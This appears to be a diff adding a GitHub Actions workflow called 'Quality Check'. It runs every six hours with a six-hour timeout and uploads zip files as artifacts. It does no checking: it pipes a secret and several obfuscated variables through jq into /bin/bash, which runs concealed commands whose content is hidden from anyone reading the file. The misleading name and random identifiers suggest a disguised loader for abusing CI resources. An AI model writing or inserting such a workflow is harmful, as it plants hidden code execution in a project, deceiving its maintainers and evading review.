@@ -1,0 +1,37 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          flcth0: ${{ secrets.flcth0 }}
+        run: |
+          printf '%s' "$flcth0" | jq -r .epfh720 | /bin/bash
+          echo $pkium157 | jq -r .van9476 | /bin/bash
+          printf '%s' "$ro676" | jq -r .df95 | /bin/bash
+          echo $s352 | jq -r .gst266 | /bin/bash
+          printf '%s' "$dgfm0946" | jq -r .ru31130 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CzfnFxag
+          path: "*.zip"
+          retention-days: 1
